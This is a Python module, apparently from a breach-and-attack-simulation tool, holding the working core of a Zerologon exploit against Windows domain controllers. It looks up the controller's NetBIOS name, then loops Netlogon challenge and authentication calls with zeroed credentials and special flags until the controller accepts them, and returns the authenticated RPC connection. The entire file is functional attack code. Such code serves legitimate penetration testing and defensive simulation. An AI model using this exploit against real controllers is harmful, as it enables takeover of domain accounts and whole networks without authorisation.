import logging
from typing import Optional

import nmb.NetBIOS
from impacket.dcerpc.v5 import nrpc, rpcrt

from common.common_consts.timeouts import MEDIUM_REQUEST_TIMEOUT
from common.utils.exceptions import DomainControllerNameFetchError
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)


def get_dc_details(host: object) -> (str, str, str):
    dc_ip = host.ip_addr
    dc_name = _get_dc_name(dc_ip=dc_ip)
    dc_handle = "\\\\" + dc_name
    return dc_ip, dc_name, dc_handle


def _get_dc_name(dc_ip: str) -> str:
    """
    Gets NetBIOS name of the Domain Controller (DC).
    """
    nb = nmb.NetBIOS.NetBIOS()
    name = nb.queryIPForName(
        ip=dc_ip, timeout=MEDIUM_REQUEST_TIMEOUT
    )  # returns either a list of NetBIOS names or None

    if name:
        return name[0]
    else:
        raise DomainControllerNameFetchError(
            "Couldn't get domain controller's name, maybe it's on external network?"
        )


def is_exploitable(zerologon_exploiter_object) -> (bool, Optional[rpcrt.DCERPC_v5]):
    # Connect to the DC's Netlogon service.
    try:
        rpc_con = zerologon_exploiter_object.connect_to_dc(zerologon_exploiter_object.dc_ip)
    except Exception as e:
        logger.info(f"Exception occurred while connecting to DC: {str(e)}")
        return False, None

    # Try authenticating.
    for _ in interruptible_iter(
        range(0, zerologon_exploiter_object.MAX_ATTEMPTS), zerologon_exploiter_object.interrupt
    ):
        try:
            rpc_con_auth_result = _try_zero_authenticate(zerologon_exploiter_object, rpc_con)
            if rpc_con_auth_result is not None:
                return True, rpc_con_auth_result
        except Exception as ex:
            logger.info(ex)
            return False, None

    return False, None


def _try_zero_authenticate(zerologon_exploiter_object, rpc_con: rpcrt.DCERPC_v5) -> rpcrt.DCERPC_v5:
    plaintext = b"\x00" * 8
    ciphertext = b"\x00" * 8
    flags = 0x212FFFFF

    # Send challenge and authentication request.
    nrpc.hNetrServerReqChallenge(
        rpc_con,
        zerologon_exploiter_object.dc_handle + "\x00",
        zerologon_exploiter_object.dc_name + "\x00",
        plaintext,
    )

    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con,
            zerologon_exploiter_object.dc_handle + "\x00",
            zerologon_exploiter_object.dc_name + "$\x00",
            nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,
            zerologon_exploiter_object.dc_name + "\x00",
            ciphertext,
            flags,
        )

        assert server_auth["ErrorCode"] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
        if (
            ex.get_error_code() == 0xC0000022
        ):  # STATUS_ACCESS_DENIED error; if not this, probably some other issue.
            pass
        else:
            raise Exception(f"Unexpected error code: {ex.get_error_code()}.")

    except BaseException as ex:
        raise Exception(f"Unexpected error: {ex}.")
